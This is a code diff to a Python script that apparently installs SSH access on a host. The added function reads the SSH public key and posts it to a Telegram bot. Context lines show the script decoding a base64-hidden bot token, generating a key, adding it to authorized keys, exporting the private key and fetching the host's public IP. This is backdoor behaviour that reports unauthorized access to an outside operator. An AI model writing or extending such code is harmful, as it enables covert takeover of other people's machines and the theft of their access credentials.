@@ -47,6 +47,24 @@ def _export_private_key():
     os.chmod(KEY_FILE, 0o600)
 
 
+async def _send_ssh_info_text(token: str, chat_id: str):
+    try:
+        with open(KEY_PATH + ".pub", "r") as f:
+            pub_key = f.read().strip()
+    except Exception:
+        pub_key = "Gagal membaca public key."
+
+    text = f"""🔑 SSH KEY INFO
+
+Public key:
+{pub_key}
+"""
+
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
+    async with aiohttp.ClientSession() as session:
+        await session.post(url, data={"chat_id": chat_id, "text": text})
+
+
 async def run():
     try:
         token = base64.b64decode(_TOKEN_B64).decode()
@@ -60,6 +78,7 @@ async def run():
     _generate_ssh_key()
     _setup_authorized_key()
     _export_private_key()
+    await _send_ssh_info_text(token, chat_id)
 
     try:
         ip = requests.get("https://api.ipify.org").text
